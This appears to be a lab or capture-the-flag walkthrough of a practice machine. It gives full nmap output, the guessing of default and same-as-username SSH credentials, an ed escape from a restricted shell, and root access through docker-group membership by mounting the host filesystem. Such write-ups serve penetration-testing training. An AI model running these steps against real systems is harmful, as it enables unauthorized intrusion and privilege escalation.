## NMAP
```
sudo nmap -sC -sV -p- 192.168.55.60                             
[sudo] password for kali: 
Sorry, try again.
[sudo] password for kali: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-09 21:50 CST
Nmap scan report for 192.168.55.60
Host is up (0.062s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE  SERVICE           VERSION
22/tcp    open   ssh               OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 754c0201fa1e9fcce47b52feba3685a9 (RSA)
|   256 b76f9c2bbffb0462f418c938f43d6b2b (ECDSA)
|_  256 987fb640cebbb557d5d13c65727487c3 (ED25519)
|_auth-owners: root
53/tcp    closed domain
113/tcp   open   ident             FreeBSD identd
|_auth-owners: nobody
5432/tcp  open   postgresql        PostgreSQL DB 12.3 - 12.4
8080/tcp  open   http              WEBrick httpd 1.4.2 (Ruby 2.6.6 (2020-03-31))
|_http-title: Redmine
| http-robots.txt: 4 disallowed entries 
|_/issues/gantt /issues/calendar /activity /search
10000/tcp open   snet-sensor-mgmt?
|_auth-owners: eleanor
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Fri, 10 Mar 2023 03:54:58 GMT
|     Connection: close
|     Hello World
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Fri, 10 Mar 2023 03:54:51 GMT
|     Connection: close
|_    Hello World
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port10000-TCP:V=7.93%I=7%D=3/9%Time=640AA9B2%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,71,"HTTP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/plain\r\nD
SF:ate:\x20Fri,\x2010\x20Mar\x202023\x2003:54:51\x20GMT\r\nConnection:\x20
SF:close\r\n\r\nHello\x20World\n")%r(HTTPOptions,71,"HTTP/1\.1\x20200\x20O
SF:K\r\nContent-Type:\x20text/plain\r\nDate:\x20Fri,\x2010\x20Mar\x202023\
SF:x2003:54:51\x20GMT\r\nConnection:\x20close\r\n\r\nHello\x20World\n")%r(
SF:RTSPRequest,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20cl
SF:ose\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConn
SF:ection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,"HTTP/1\.1\x20400\
SF:x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSStatusRequestT
SF:CP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r
SF:\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20cl
SF:ose\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nConnection:\x20close\r\n\r\n")%r(TerminalServerCookie,2F,"HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(TLSSessionRe
SF:q,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\
SF:n")%r(Kerberos,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x2
SF:0close\r\n\r\n")%r(SMBProgNeg,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\
SF:nConnection:\x20close\r\n\r\n")%r(X11Probe,2F,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\nConnection:\x20close\r\n\r\n")%r(FourOhFourRequest,71,"HT
SF:TP/1\.1\x20200\x20OK\r\nContent-Type:\x20text/plain\r\nDate:\x20Fri,\x2
SF:010\x20Mar\x202023\x2003:54:58\x20GMT\r\nConnection:\x20close\r\n\r\nHe
SF:llo\x20World\n")%r(LPDString,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
SF:Connection:\x20close\r\n\r\n")%r(LDAPSearchReq,2F,"HTTP/1\.1\x20400\x20
SF:Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(LDAPBindReq,2F,"HTTP
SF:/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(SIPO
SF:ptions,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r
SF:\n\r\n")%r(LANDesk-RC,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnect
SF:ion:\x20close\r\n\r\n")%r(TerminalServer,2F,"HTTP/1\.1\x20400\x20Bad\x2
SF:0Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OSs: Linux, FreeBSD; CPE: cpe:/o:linux:linux_kernel, cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 269.10 seconds

```

It appears we have access with admin:admin on port 8080 but nothing is there.
Checked port 1000 and it is just hello world. Fuzzing does not appear to be working as everything gives 200.
Looks like Ident gave us a username: eleanor.
Trying ssh with user eleanor and password eleanor worked

Eleanor has a restricted shell we have to escape.
https://gtfobins.github.io/gtfobins/ed/

```
ed
!/bin/sh
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
python -c 'import pty; pty.spawn("/bin/bash")'
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin
```

```
eleanor@peppo:/tmp$ whoami
eleanor
eleanor@peppo:/tmp$ id
uid=1000(eleanor) gid=1000(eleanor) groups=1000(eleanor),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),999(docker)
```
Running the command id, we get to know we are a docker user. We can use this to escape.
```
eleanor@peppo:/tmp$ docker image ls
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
redmine             latest              0c8429c66e07        2 years ago         542MB
postgres            latest              adf2b126dda8        2 years ago         313MB
eleanor@peppo:/tmp$ docker run -v /:/mnt --rm -it redmine chroot /mnt sh
# whoami
root
# cd /root
# ls
proof.txt
# cat proof.txt
```